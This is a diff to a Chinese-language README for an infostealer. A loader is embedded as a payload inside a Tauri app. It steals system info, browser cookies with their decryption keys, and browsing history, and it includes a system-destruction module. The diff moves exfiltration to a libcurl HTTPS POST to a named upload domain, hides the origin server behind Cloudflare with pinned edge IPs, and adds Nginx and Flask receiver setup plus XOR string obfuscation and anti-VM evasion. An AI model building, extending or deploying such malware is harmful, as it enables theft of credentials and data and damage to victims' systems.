@@ -19,6 +19,7 @@ MSBuild injector.sln /p:Configuration=Release /p:Platform=x64
 
 # 复制到 Tauri 嵌入位置
 copy x64\Release\loader.exe src-tauri\payload.exe
+copy injector\libcurl-x64.dll src-tauri\
 
 # 编译 Tauri 前端
 bun tauri build
@@ -35,7 +36,7 @@ bun tauri build
 | 系统信息 | CPU / OS / 用户 |
 | 浏览器 Cookies | Chrome / Edge / Brave / Opera / Yandex / Firefox + Local State 密钥 |
 | 浏览器历史 | Chrome / Edge / Brave / Opera / Yandex / Firefox |
-| 数据外传 | WinHTTP POST 至服务器 |
+| 数据外传 | libcurl (LibreSSL) HTTPS POST 至服务器 |
 
 ### 系统破坏
 | 模块 | 说明 |
@@ -63,17 +64,22 @@ bun tauri build
 - 所有 WinExec 命令字符串 XOR 加密（Key: 0x55）
 - 编译后不存在明文攻击指令
 - 反虚拟机：检测 VMware / VirtualBox，弹窗退出
+- 网络通信使用 libcurl (LibreSSL TLS)，非标准 WinHTTP/WinInet 栈
 
 ## 服务器部署
 
 ### 网络架构
 
 ```
-客户端 → upload.swangnetwork.asia:443 (HTTPS)
-       → Cloudflare DNS (隐藏源站IP)
-       → Nginx :443 (server_name 你的域名)
-       → proxy_pass http://127.0.0.1:8891 (Flask receiver)
+客户端 → libcurl + CURLOPT_RESOLVE → 你的域名:443 (HTTPS)
+       强制解析到 CF可用边缘IP (跳过坏 CF 边缘)
+       → Cloudflare → Nginx :443 → proxy_pass http://127.0.0.1:8891 (Flask)
 ```
+
+**为什么用 libcurl 而非 WinHTTP**：某个 CF 边缘节点拒绝 Schannel ClientHello（RST），
+另一正常。WinHTTP 无法解耦 TCP 目标 IP 和 TLS SNI，libcurl
+通过 `CURLOPT_RESOLVE` 强制 DNS 解析至可用 IP，且 TLS 栈为 LibreSSL 而非 Schannel，
+彻底规避该问题。libcurl-x64.dll 随 EXE 一同嵌入 Tauri 并释放到 %TEMP%。
 
 ### Cloudflare 配置
 
@@ -108,6 +114,8 @@ server {
     ssl_certificate     /etc/nginx/ssl/upload-origin.pem;
     ssl_certificate_key /etc/nginx/ssl/upload-origin.key;
 
+    client_max_body_size 100m;  # multipart 上传可能 8-10MB
+
     location / {
         proxy_pass http://127.0.0.1:8891;
         proxy_set_header Host $host;
@@ -123,15 +131,7 @@ ln -sf /etc/nginx/sites-available/upload /etc/nginx/sites-enabled/
 nginx -t && systemctl reload nginx
 ```
 
-### 服务器端口
-
-| 端口 | 服务 | 监听 |
-|------|------|------|
-| 22 | SSH | 0.0.0.0 |
-| 80/443 | Nginx (CF 回源) | 0.0.0.0 |
-| 8891 | Flask receiver (上传 + s-ui API) | 127.0.0.1 |
-| 2087 | s-ui Web 面板 | 0.0.0.0 |
-| 3306 | MariaDB | 127.0.0.1 |
+### Flask receiver 需要自行部署到服务器
 
 ### API 端点 (Flask :8891)
 
@@ -148,13 +148,14 @@ nginx -t && systemctl reload nginx
 ```cpp
 #pragma once
 #define SERVER_HOST L"你的域名"
-#define SERVER_HTTP "http://你的域名:8080"
+#define SERVER_HTTP "https://你的域名"
 ```
-建议通过 Cloudflare 代理域名连接
+建议通过 Cloudflare 代理域名连接；代码中 CURLOPT_RESOLVE 固定解析到可用 CF 边缘 IP。
 
 其他可配置项：
 - **ANTI_VM**：`#define ANTI_VM 1`（1=拦截虚拟机，0=允许）
 - **XOR Key**：`XKEY` 常量（默认 0x55）
+- **CF 边缘 IP**：`simple_upload()` 中 `resolve_str` 硬编码的目标 IP（如需更换）
 
 ## 注意
 
